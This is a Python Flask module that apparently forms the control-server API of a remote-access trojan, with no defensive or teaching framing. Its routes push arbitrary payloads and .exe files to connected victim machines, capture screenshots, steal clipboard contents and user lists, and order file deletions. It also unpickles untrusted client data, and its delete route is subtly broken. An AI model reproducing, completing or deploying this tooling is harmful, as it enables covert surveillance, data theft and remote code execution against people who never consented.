import base64
import flask
import threading
import common
import json
import os
import pickle
import codecs


api_routes = flask.Blueprint('api', __name__)


@api_routes.route('/api/payload/exec', methods=['POST'])
def exec_payload():
	data = json.loads(flask.request.data.decode())
	client = data["client"]
	payload = data["payload"]

	if client and payload:
		client_sock = [host for host in common.hosts if host[0][0] == client][0][1]
		if client_sock:
			common.send_msg(client_sock, payload.encode())
			return "Sent", 200
		else:
			return "Error", 500
	else:
		return "Missing params", 400


@api_routes.route('/api/payload/get', methods=['POST'])
def get_payload():
	data = json.loads(flask.request.data.decode())
	name = data["name"]

	if name:
		f = open(os.path.dirname(__file__) + "/../payloads/%s.exe" % name, "rb")
		payload_bytes = f.read()
		f.close()

		if payload_bytes:
			return base64.b64encode(payload_bytes), 200
		else:
			return "Error", 500
	else:
		return "Missing params", 400


@api_routes.route('/api/payload/ss', methods=['POST'])
def ss_payload():
	data = json.loads(flask.request.data.decode())
	client = data["client"]

	if client:
		client_sock = [host for host in common.hosts if host[0][0] == client][0][1]
		if client_sock:
			common.send_msg(client_sock, "screenshot".encode())
			image = common.recv_msg(client_sock)
			return image.decode(), 200
		else:
			return "Error", 500
	else:
		return "Missing params", 400


@api_routes.route('/api/payload/clipboard', methods=['POST'])
def clipboard_payload():
	data = json.loads(flask.request.data.decode())
	client = data["client"]

	if client:
		client_sock = [host for host in common.hosts if host[0][0] == client][0][1]
		if client_sock:
			common.send_msg(client_sock, "clipboard".encode())
			clipboard = common.recv_msg(client_sock)
			return clipboard.decode(), 200
		else:
			return "Error", 500
	else:
		return "Missing params", 400


@api_routes.route('/api/payload/users', methods=['POST'])
def users_payload():
	data = json.loads(flask.request.data.decode())
	client = data["client"]

	if client:
		client_sock = [host for host in common.hosts if host[0][0] == client][0][1]
		if client_sock:
			common.send_msg(client_sock, "users".encode())
			users = common.recv_msg(client_sock)
			users = pickle.loads(codecs.decode(users, "base64"))
			return users, 200
		else:
			return "Error", 500
	else:
		return "Missing params", 400


@api_routes.route('/api/payload/delete', methods=['POST'])
def delete_file(file_name):
	msg = f'delete {file_name}'

	data = json.loads(flask.request.data.decode())
	client = data["client"]

	if client:
		client_sock = [host for host in common.hosts if host[0][0] == client][0][1]
		if client_sock:
			common.send_msg(client_sock, msg.encode())
			return 'File Deleted', 200
		else:
			return "Error", 500
	else:
		return "Missing params", 400
